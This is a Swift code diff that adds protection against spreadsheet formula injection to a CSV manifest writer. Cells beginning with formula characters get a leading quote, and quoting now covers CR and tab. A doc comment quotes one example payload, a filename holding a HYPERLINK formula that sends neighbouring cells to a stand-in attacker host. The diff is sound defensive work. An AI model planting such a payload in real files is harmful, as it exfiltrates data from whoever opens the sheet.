@@ -186,9 +186,32 @@ enum ManifestWriter {
         return out
     }
 
-    private static func csvField(_ value: String) -> String {
-        guard value.contains(where: { $0 == "," || $0 == "\"" || $0 == "\n" }) else { return value }
-        return "\"" + value.replacingOccurrences(of: "\"", with: "\"\"") + "\""
+    /// Characters that make a spreadsheet treat a cell as a formula rather than
+    /// text. Excel, Numbers, and LibreOffice all do this on open.
+    private static let formulaLeaders: Set<Character> = ["=", "+", "-", "@", "\t", "\r"]
+
+    /// RFC-4180 quoting, plus neutralization of spreadsheet formula injection.
+    ///
+    /// The `name` column is the **raw filename as it appeared on the card** — the
+    /// one field in the manifest that never passes `PathPlanner.sanitize` — and
+    /// this CSV exists to be opened in a spreadsheet. A card file named
+    /// `=HYPERLINK("https://evil.tld/?"&A2,"Photo OK").CR2` would otherwise land
+    /// in the sheet as a live formula that exfiltrates neighbouring cells on
+    /// click. Prefixing a single quote is the standard fix: spreadsheets strip it
+    /// on display, so the cell still reads as the original filename.
+    ///
+    /// `\r` and `\t` are in both the quote trigger and the leader set: a bare CR
+    /// would otherwise break row structure, and a leading tab is treated as a
+    /// formula lead-in by some readers.
+    static func csvField(_ value: String) -> String {
+        var out = value
+        if let first = out.first, formulaLeaders.contains(first) {
+            out = "'" + out
+        }
+        guard out.contains(where: { $0 == "," || $0 == "\"" || $0 == "\n" || $0 == "\r" || $0 == "\t" }) else {
+            return out
+        }
+        return "\"" + out.replacingOccurrences(of: "\"", with: "\"\"") + "\""
     }
 
     private static func fileStamp(_ date: Date) -> String {
